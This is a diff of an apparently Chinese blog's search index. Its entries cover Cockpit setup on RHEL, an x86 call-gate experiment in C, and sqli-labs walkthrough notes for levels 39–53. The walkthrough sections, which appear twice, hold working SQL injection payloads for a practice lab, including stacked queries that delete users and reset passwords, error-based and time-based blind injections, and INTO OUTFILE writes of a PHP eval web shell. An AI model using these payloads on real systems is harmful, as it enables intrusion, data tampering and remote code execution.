@@ -18,6 +18,32 @@
       </tags>
   </entry>
   <entry>
+    <title>Cockpit For RHEL8</title>
+    <url>/2020/03/05/Cockpit-For-RHEL8/</url>
+    <content><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><blockquote>
+<p><a href="https://cockpit-project.org/">Cockpit</a> : The <a href="https://cockpit-project.org/#easy-to-use">easy-to-use</a>, <a href="https://cockpit-project.org/#integrated">integrated</a>, <a href="https://cockpit-project.org/#glanceable">glanceable</a>, and <a href="https://cockpit-project.org/#open-ended">open</a> web-based interface for your servers .</p>
+</blockquote>
+<a id="more"></a>
+
+<p>在RHEL8上自动安装了Cockpit，因此不需要添加任何非默认的软件库。</p>
+<p>如果是RHEL7的话则需要添加Extras软件库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo subscription-manager repos --enable rhel-7-server-extras-rpms</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h1 id="0x01-开始安装"><a href="#0x01-开始安装" class="headerlink" title="0x01 开始安装"></a>0x01 开始安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo yum install cockpit -y 		&#x2F;&#x2F;安装Cockpit</span><br><span class="line"></span><br><span class="line">$ sudo systemctl enable --now cockpit.socket 		&#x2F;&#x2F;设置开机自启动</span><br><span class="line"></span><br><span class="line">$ sudo firewall-cmd --add-service&#x3D;cockpit --permanent 		&#x2F;&#x2F;打开防火墙放行Cockpit</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="0x02-开始使用"><a href="#0x02-开始使用" class="headerlink" title="0x02 开始使用"></a>0x02 开始使用</h1><p>如果服务器上已经安装了Cockpit，则将Web浏览器指向： <strong>https://</strong> <strong>IP:9090</strong></p>
+<p>且使用系统用户帐户和密码登录。</p>
+<p><img src="https://i.loli.net/2020/03/05/QbFvErRzWBfLpxg.png" alt="1.png"></p>
+<p><img src="https://i.loli.net/2020/03/05/ISqGdka8HfbT67B.png" alt="2.png"></p>
+<p><a href="https://cockpit-project.org/guide/latest/">Cockpit Guide</a></p>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF[SUCTF 2019]EasySQL</title>
     <url>/2020/09/17/BUUCTF-SUCTF-2019-EasySQL/</url>
     <content><![CDATA[<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><a id="more"></a>
@@ -50,32 +76,6 @@
         <tag>笔记</tag>
         <tag>渗透</tag>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Cockpit For RHEL8</title>
-    <url>/2020/03/05/Cockpit-For-RHEL8/</url>
-    <content><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><blockquote>
-<p><a href="https://cockpit-project.org/">Cockpit</a> : The <a href="https://cockpit-project.org/#easy-to-use">easy-to-use</a>, <a href="https://cockpit-project.org/#integrated">integrated</a>, <a href="https://cockpit-project.org/#glanceable">glanceable</a>, and <a href="https://cockpit-project.org/#open-ended">open</a> web-based interface for your servers .</p>
-</blockquote>
-<a id="more"></a>
-
-<p>在RHEL8上自动安装了Cockpit，因此不需要添加任何非默认的软件库。</p>
-<p>如果是RHEL7的话则需要添加Extras软件库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo subscription-manager repos --enable rhel-7-server-extras-rpms</span><br></pre></td></tr></table></figure>
-
-
-<hr>
-<h1 id="0x01-开始安装"><a href="#0x01-开始安装" class="headerlink" title="0x01 开始安装"></a>0x01 开始安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo yum install cockpit -y 		&#x2F;&#x2F;安装Cockpit</span><br><span class="line"></span><br><span class="line">$ sudo systemctl enable --now cockpit.socket 		&#x2F;&#x2F;设置开机自启动</span><br><span class="line"></span><br><span class="line">$ sudo firewall-cmd --add-service&#x3D;cockpit --permanent 		&#x2F;&#x2F;打开防火墙放行Cockpit</span><br></pre></td></tr></table></figure>
-<hr>
-<h1 id="0x02-开始使用"><a href="#0x02-开始使用" class="headerlink" title="0x02 开始使用"></a>0x02 开始使用</h1><p>如果服务器上已经安装了Cockpit，则将Web浏览器指向： <strong>https://</strong> <strong>IP:9090</strong></p>
-<p>且使用系统用户帐户和密码登录。</p>
-<p><img src="https://i.loli.net/2020/03/05/QbFvErRzWBfLpxg.png" alt="1.png"></p>
-<p><img src="https://i.loli.net/2020/03/05/ISqGdka8HfbT67B.png" alt="2.png"></p>
-<p><a href="https://cockpit-project.org/guide/latest/">Cockpit Guide</a></p>
-]]></content>
-      <tags>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -487,101 +487,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-lab Less 39-Less 53</title>
-    <url>/2020/09/09/sqli-lab-Less-39-Less-53/</url>
-    <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-39-Less-53"><a href="#Sqli-lab-过关笔记-Less-39-Less-53" class="headerlink" title="Sqli-lab 过关笔记 Less 39-Less 53"></a>Sqli-lab 过关笔记 Less 39-Less 53</h1><a id="more"></a>
-<h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>这里加\后判断为数字型注入<br>因为是堆叠注入直接尝试删除用户Sunr</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>; <span class="keyword">delete</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> &quot;Sunr&quot; #</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2020/09/09/8xHFoXUtyJmTGnv.png" alt="image.png"><br>发现并没有被删除</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>; <span class="keyword">update</span> users <span class="keyword">set</span> password<span class="operator">=</span>&quot;admin&quot; <span class="keyword">where</span> username<span class="operator">=</span>&quot;Sunr&quot;; #</span><br></pre></td></tr></table></figure>
-<p>我们来使用更新的话可以看到<br><img src="https://i.loli.net/2020/09/09/L3Bb5rfMkpKunZA.png" alt="image.png"><br>passwd成功更新</p>
-<hr>
-<h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>测试闭合方式为单引号加小括号闭合<br>开始构造语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) ; update users set password=&quot;Sunr&quot; where username=&quot;Sunr&quot;; or (&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>这里我们不再构造第一个语句，直接尝试更新用户名密码<br><img src="https://i.loli.net/2020/09/09/ZE6vis3LtPj5hRN.png" alt="image.png"><br>成功</p>
-<hr>
-<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>首先探测闭合方式确定为数字型注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span>; <span class="keyword">select</span> &quot;&lt;?php eval($_POST[x]);?&gt;&quot; <span class="keyword">into</span> outfile &quot;C:/PHPStudy/WWW/sqli/Less-41/1.php&quot;; #</span><br></pre></td></tr></table></figure>
-<p>这里我们尝试写入shell<br><img src="https://i.loli.net/2020/09/09/qzUVlPeynMDxcZ8.png" alt="image.png"><br>成功</p>
-<hr>
-<h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>打开这一关又是熟悉的二次注入<br>试试创建新用户<br><img src="https://i.loli.net/2020/09/09/fb2tBWZysKXqU3Y.png" alt="image.png"><br>太鸡贼了，害<br>试试登录界面吧<br><img src="https://i.loli.net/2020/09/09/lfadW2RSUb9hup6.png" alt="image.png"><br>唔不行，用户名不行那就试试密码</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;#&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
-<p>嘿嘿，果然是密码不加过滤</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-42/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
-<p>继续尝试写shell</p>
-<p>成功</p>
-<p>不过，，，</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; select &quot;&lt;script&gt;alert(/1/)&lt;/script&gt;&quot; #</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2020/09/09/o2PrFykSJg6HGbs.png" alt="image.png"><br>可能我是闲得蛋疼吧</p>
-<hr>
-<h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>又是一样的界面，例行进行探测闭合方式<br><code>&#39;)</code>闭合<br>同上题构造语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;); select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-43/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<hr>
-<h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>还是熟悉的套路，首先探测闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
-<p>确定为单引号闭合<br>同上题构造语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-44/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<hr>
-<h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>同上题，探测闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) or 1=1 #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
-<p>为<code>&#39;)</code>闭合</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;); select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-45/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<hr>
-<blockquote>
-<p>注：以上写shell的条件均要满足Less-7的条件</p>
-</blockquote>
-<hr>
-<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>又回到了熟悉的GET注入<br>又有提示：Please input parameter as SORT with numeric value<br>嗯，于是就改成</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">index.php?sort<span class="operator">=</span>id</span><br></pre></td></tr></table></figure>
-<p>探测一下闭合方式<br>估计大概的sql语句应该是</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> $<span class="keyword">value</span>;</span><br></pre></td></tr></table></figure>
-<p>确实是典型的order by注入<br>我们来构造语句，我们直接使用报错注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br></pre></td></tr></table></figure>
-<p>成功爆出库</p>
-<hr>
-<h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>首先探测出是单引号闭合<br>根据上题直接闭合构造语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="string">&#x27;||updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>成功爆出库</p>
-<hr>
-<h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>这次是盲注，没有报错提示不能使用报错注入<br>走一波时间盲注<br>探测为数字型<br>构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span>if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,(<span class="keyword">select</span>(<span class="number">1</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">2</span>)))aaaa)) # </span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<hr>
-<h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>同上，先判断闭合方式再构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||if(1=2,1,(select(1)from(select(sleep(2)))aaaa)) or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<hr>
-<h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>探测闭合为数字型后直接</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br></pre></td></tr></table></figure>
-<p>居然成功了<br>然后感觉不太对，emmm<br>看了看源码发现</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">···</span><br><span class="line">if (mysqli_multi_query($con1, $<span class="keyword">sql</span>))</span><br><span class="line">···</span><br></pre></td></tr></table></figure>
-<p>这里执行sql语句的函数是mysqli_multi_query(),可以一次执行多条语句<br>也就是之前的堆叠注入，这里不再演示</p>
-<hr>
-<h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>同上，先判断闭合方式再构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||updatexml(1,concat(0x7e,(select database()),0x7e),1);select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-45/1.php&quot;; or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>成功<br>同样这也是用mysqli_multi_query()<br>存在堆叠注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="string">&#x27;;select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-51/1.php&quot;; or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>这一题是盲注<br>其余同上，直接贴语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> ;<span class="keyword">select</span> &quot;&lt;?php eval($_POST[x]);?&gt;&quot; <span class="keyword">into</span> outfile &quot;C:/PHPStudy/WWW/sqli/Less-52/1.php&quot;; <span class="comment">-- d d</span></span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>同上，直接贴语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="string">&#x27;;select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-53/1.php&quot;; or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<hr>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-        <tag>渗透</tag>
-        <tag>sqli-lab</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-lab Less 54-Less 65</title>
     <url>/2020/09/10/sqli-lab-Less-54-Less-65/</url>
     <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-54-Less-65"><a href="#Sqli-lab-过关笔记-Less-54-Less-65" class="headerlink" title="Sqli-lab 过关笔记 Less 54-Less 65"></a>Sqli-lab 过关笔记 Less 54-Less 65</h1><blockquote>
@@ -683,6 +588,165 @@
 <a id="more"></a>
 
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> cs_eip[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x48</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">DWORD data;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">InGate1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm </span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>+<span class="number">0x08</span>]</span><br><span class="line">		push ebx</span><br><span class="line">		popfd</span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>+<span class="number">0x04</span>]</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x08</span>],ebx</span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>]</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x04</span>],ebx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		pop eax</span><br><span class="line">		retf</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">CallGate2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm </span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax+<span class="number">0x20</span>]</span><br><span class="line">		mov ecx,[eax+<span class="number">0x24</span>+<span class="number">0x04</span>]</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x04</span>],ebx</span><br><span class="line"></span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>]</span><br><span class="line">		mov [eax+<span class="number">0x20</span>],ebx</span><br><span class="line"></span><br><span class="line">		mov [eax+<span class="number">0x24</span>],ecx</span><br><span class="line"></span><br><span class="line">		popad</span><br><span class="line">		iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="number">32</span></span><br><span class="line">		call fword ptr[cs_eip]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>笔记</tag>
+        <tag>保护模式</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-lab Less 39-Less 53</title>
+    <url>/2020/09/09/sqli-lab-Less-39-Less-53/</url>
+    <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-39-Less-53"><a href="#Sqli-lab-过关笔记-Less-39-Less-53" class="headerlink" title="Sqli-lab 过关笔记 Less 39-Less 53"></a>Sqli-lab 过关笔记 Less 39-Less 53</h1><a id="more"></a>
+<h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>这里加\后判断为数字型注入<br>因为是堆叠注入直接尝试删除用户Sunr</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>; <span class="keyword">delete</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> &quot;Sunr&quot; #</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/09/09/8xHFoXUtyJmTGnv.png" alt="image.png"><br>发现并没有被删除</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>; <span class="keyword">update</span> users <span class="keyword">set</span> password<span class="operator">=</span>&quot;admin&quot; <span class="keyword">where</span> username<span class="operator">=</span>&quot;Sunr&quot;; #</span><br></pre></td></tr></table></figure>
+<p>我们来使用更新的话可以看到<br><img src="https://i.loli.net/2020/09/09/L3Bb5rfMkpKunZA.png" alt="image.png"><br>passwd成功更新</p>
+<hr>
+<h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>测试闭合方式为单引号加小括号闭合<br>开始构造语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) ; update users set password=&quot;Sunr&quot; where username=&quot;Sunr&quot;; or (&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>这里我们不再构造第一个语句，直接尝试更新用户名密码<br><img src="https://i.loli.net/2020/09/09/ZE6vis3LtPj5hRN.png" alt="image.png"><br>成功</p>
+<hr>
+<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>首先探测闭合方式确定为数字型注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span>; <span class="keyword">select</span> &quot;&lt;?php eval($_POST[x]);?&gt;&quot; <span class="keyword">into</span> outfile &quot;C:/PHPStudy/WWW/sqli/Less-41/1.php&quot;; #</span><br></pre></td></tr></table></figure>
+<p>这里我们尝试写入shell<br><img src="https://i.loli.net/2020/09/09/qzUVlPeynMDxcZ8.png" alt="image.png"><br>成功</p>
+<hr>
+<h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>打开这一关又是熟悉的二次注入<br>试试创建新用户<br><img src="https://i.loli.net/2020/09/09/fb2tBWZysKXqU3Y.png" alt="image.png"><br>太鸡贼了，害<br>试试登录界面吧<br><img src="https://i.loli.net/2020/09/09/lfadW2RSUb9hup6.png" alt="image.png"><br>唔不行，用户名不行那就试试密码</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;#&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
+<p>嘿嘿，果然是密码不加过滤</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-42/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
+<p>继续尝试写shell</p>
+<p>成功</p>
+<p>不过，，，</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; select &quot;&lt;script&gt;alert(/1/)&lt;/script&gt;&quot; #</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/09/09/o2PrFykSJg6HGbs.png" alt="image.png"><br>可能我是闲得蛋疼吧</p>
+<hr>
+<h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>又是一样的界面，例行进行探测闭合方式<br><code>&#39;)</code>闭合<br>同上题构造语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;); select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-43/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>还是熟悉的套路，首先探测闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
+<p>确定为单引号闭合<br>同上题构造语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-44/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>同上题，探测闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) or 1=1 #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
+<p>为<code>&#39;)</code>闭合</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;); select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-45/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<blockquote>
+<p>注：以上写shell的条件均要满足Less-7的条件</p>
+</blockquote>
+<hr>
+<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>又回到了熟悉的GET注入<br>又有提示：Please input parameter as SORT with numeric value<br>嗯，于是就改成</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">index.php?sort<span class="operator">=</span>id</span><br></pre></td></tr></table></figure>
+<p>探测一下闭合方式<br>估计大概的sql语句应该是</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> $<span class="keyword">value</span>;</span><br></pre></td></tr></table></figure>
+<p>确实是典型的order by注入<br>我们来构造语句，我们直接使用报错注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br></pre></td></tr></table></figure>
+<p>成功爆出库</p>
+<hr>
+<h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>首先探测出是单引号闭合<br>根据上题直接闭合构造语句</p>
